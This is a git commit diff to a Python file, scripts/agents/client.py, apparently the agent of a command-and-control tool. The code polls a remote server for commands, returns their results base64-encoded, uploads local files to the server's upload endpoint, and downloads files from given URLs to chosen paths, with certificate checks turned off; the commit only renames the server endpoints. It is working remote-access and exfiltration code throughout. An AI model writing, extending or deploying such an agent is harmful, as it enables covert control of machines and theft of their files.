34db0e2d884df26c68e6195041f8d024c8b60911
Ug0Security <c.vallicari@gmail.com>
2022-10-15 14:46:02 +0200

    Update client.py

--- scripts/agents/client.py
+++ scripts/agents/client.py
@@ -16,11 +16,11 @@ message_bytes = message.encode('ascii')
 base64_bytes = base64.b64encode(message_bytes)
 base64_message = base64_bytes.decode('ascii')
 
-hello = requests.get(url + "/res.php?res=" + base64_message + "&id="+uid, verify=False)
+hello = requests.get(url + "/hey.php?m=res&res=" + base64_message + "&id="+uid, verify=False)
 
 while True:
 	try:
-		cmds = requests.get(url + "/cmds.php?id="+uid+"&o=P", verify=False)
+		cmds = requests.get(url + "/hey.php?m=cmds&id="+uid+"&o=P", verify=False)
 		cmds = str(cmds.text)
 		for lines in cmds.splitlines():
 			if str(uid) in lines:
@@ -33,7 +33,7 @@ while True:
 					res_bytes = res.encode('ascii')
 					resbase64_bytes = base64.b64encode(res_bytes)
 					resbase64 = resbase64_bytes.decode('ascii')
-					gimme = requests.get(url + "/res.php?res=" + resbase64 + "&id="+uid, verify=False)
+					gimme = requests.get(url + "/hey.php?m=res&res=" + resbase64 + "&id="+uid, verify=False)
 					
 				if act == "download":
 					filedl = str(lines.split(":",2)[2]).strip()
@@ -45,20 +45,20 @@ while True:
 					multipart_form_data = {
    					'data': (str(filenamedl).strip(), open(filedl, 'rb')),
 					}
-					tellme = requests.get(url + "/res.php?res=" + base64_messagedl + "&id="+uid, verify=False)
-					gimme = requests.post(url + "/up.php?id="+uid, files=multipart_form_data , verify=False)
+					tellme = requests.get(url + "/hey.php?m=res&res=" + base64_messagedl + "&id="+uid, verify=False)
+					gimme = requests.post(url + "/hey.php?m=up&id="+uid, files=multipart_form_data , verify=False)
 				
 				
 				if act == "upload":
 					s = ":"
-					urldl = s.join({str(lines.split(":",5)[3]).strip(), str(lines.split(":",5)[2]).strip()})
-					print(urldl)
+					urldl = s.join({str(lines.split(":",5)[2]).strip(), str(lines.split(":",5)[3]).strip()})
+					
 					path =  str(lines.split(":",5)[-1]).strip()
 					messagedl = "Downloading "+ str(urldl) + " to "+ path
 					messagedl_bytes = messagedl.encode('ascii')
 					base64_bytes = base64.b64encode(messagedl_bytes)
 					base64_messagedl = base64_bytes.decode('ascii')
-					tellme = requests.get(url + "/res.php?res=" + base64_messagedl + "&id="+uid, verify=False)
+					tellme = requests.get(url + "/hey.php?m=res&res=" + base64_messagedl + "&id="+uid, verify=False)
 					takethis = requests.get(urldl, verify=False)
 					with open(path, 'wb') as f:
     						f.write(takethis.content)
